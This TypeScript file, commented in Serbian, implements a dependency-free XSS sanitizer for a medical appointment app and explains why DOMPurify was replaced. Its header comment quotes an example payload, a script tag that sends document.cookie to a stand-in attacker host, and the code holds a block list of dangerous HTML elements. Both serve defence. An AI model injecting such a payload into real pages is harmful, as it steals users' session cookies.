/**
 * Zastita od XSS napada (Cross-Site Scripting).
 *
 * XSS je napad u kome napadac u obicno tekstualno polje upise HTML ili
 * JavaScript kod, u nadi da ce se taj kod izvrsiti kada neko drugi otvori
 * stranicu. Primer u ovoj aplikaciji: pacijent kao razlog dolaska upise
 *   <script>fetch('https://napadac.rs?c='+document.cookie)</script>
 * a lekar kasnije otvori spisak termina.
 *
 * React sam po sebi dobro stiti od XSS-a jer sav tekst ispisuje kao tekst,
 * a ne kao HTML. Ipak, tekst se cisti PRE upisa u bazu, iz dva razloga:
 *  1. podaci iz baze mogu jednog dana zavrsiti i van React-a (izvestaj, PDF,
 *     eksport u drugi sistem), gde te zastite nema,
 *  2. u bazi ne treba da stoji "prljav" podatak - karton treba da sadrzi
 *     medicinski tekst, a ne tudji kod.
 *
 * Ovo je princip odbrane u dubinu: ne oslanjamo se na jedan sloj zastite.
 *
 * ZASTO BEZ BIBLIOTEKE
 * Ranije je ovde koriscen DOMPurify. On je odlicna biblioteka, ali resava tezi
 * problem od naseg: ume da zadrzi bezbedan HTML (podebljanje, spiskove, tabele).
 * Nama nista od toga ne treba - u karton ide obican tekst, pa se BAS SVE oznake
 * uklanjaju. Da bi to radio, DOMPurify mora da ima pravi DOM, pa na serveru
 * povlaci jsdom sa preko stotinu zavisnosti. Jedna od njih (@exodus/bytes) je
 * ESM modul koji se u Vercel okruzenju ucitava preko require(), sto Node odbija
 * greskom ERR_REQUIRE_ESM - i cela ruta za registraciju je vracala 500.
 *
 * Posto nam treba samo "izbaci sav HTML", to se resava sa dva prolaza kroz
 * tekst, bez ijedne zavisnosti. Kod je kraci, brzi, radi isto u pregledacu,
 * u Docker kontejneru i na Vercel-u, a ponasanje cuvaju testovi u
 * __tests__/lib/security.test.ts.
 */

/**
 * Oznake kod kojih se brise I sadrzaj izmedju otvorene i zatvorene oznake.
 *
 * Kod obicnih oznaka tekst je koristan pa se cuva: "<b>grudima</b>" treba da
 * postane "grudima". Kod ovih oznaka sadrzaj NIJE tekst nego kod (JavaScript,
 * CSS, ugnjezdena stranica), pa bi njegovo zadrzavanje ostavilo u kartonu
 * besmislicu tipa "alert(1)" ili "body{}".
 */
const DANGEROUS_ELEMENTS =
  /<(script|style|noscript|iframe|object|embed|template|svg|math|title|head)\b[\s\S]*?<\/\1\s*>/gi;

/**
 * Sve sto lici na HTML oznaku: < , opciona kosa crta, pa SLOVO.
 *
 * Zahtev da iza < ide slovo je namerno - zahvaljujuci njemu matematicki zapis
 * "puls < 90" ostaje netaknut, jer iza znaka manje stoji razmak i cifra.
 * Znak > na kraju je oznacen kao opcion (>?), da bi se uklonila i nedovrsena
 * oznaka na kraju teksta, kakvu napadac ostavi kad pokusa da "produzi" unos.
 */
const HTML_TAG = /<\/?[a-zA-Z][^>]*>?/g;

/** Osnovni HTML entiteti koje treba vratiti u obicne karaktere. */
const HTML_ENTITIES: Record<string, string> = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&#39;': "'",
  '&nbsp;': ' ',
};

function decodeEntities(value: string): string {
  return value.replace(/&(amp|lt|gt|quot|#39|nbsp);/g, (entity) => HTML_ENTITIES[entity] ?? entity);
}

/** Jedan prolaz ciscenja: prvo opasne celine sa sadrzajem, pa preostale oznake. */
function stripHtml(value: string): string {
  return value.replace(DANGEROUS_ELEMENTS, '').replace(HTML_TAG, '');
}

/**
 * Uklanja HTML iz teksta i vraca cist, citljiv tekst.
 *
 * Postupak ima tri koraka, i svaki ima svoj razlog:
 *
 * 1. Uklanjaju se sve oznake. Sadrzaj opasnih oznaka (<script>, <style>) ide
 *    zajedno sa njima, a tekst obicnih oznaka se cuva, pa
 *    "Bol u <b>grudima</b>" postaje "Bol u grudima", a ne prazan string.
 *
 * 2. Entiteti se vracaju u obicne karaktere. U zdravstvenom kartonu se znaci
 *    manje i vece koriste sasvim legitimno - npr. "temperatura > 38" - pa
 *    lekar u kartonu ne treba da cita "temperatura &gt; 38".
 *
 * 3. Dekodiranjem je mogla nastati nova oznaka, ako je napadac unos dvostruko
 *    kodirao ("&lt;script&gt;"). Zato se ciscenje ponavlja jos jednom, nad vec
 *    dekodiranim tekstom. Bez ovog drugog prolaza dvostruko kodiran napad bi
 *    prosao kroz sito.
 */
export function sanitizeText(value: string): string {
  const withoutTags = stripHtml(value);
  const decoded = decodeEntities(withoutTags);

  return stripHtml(decoded).trim();
}
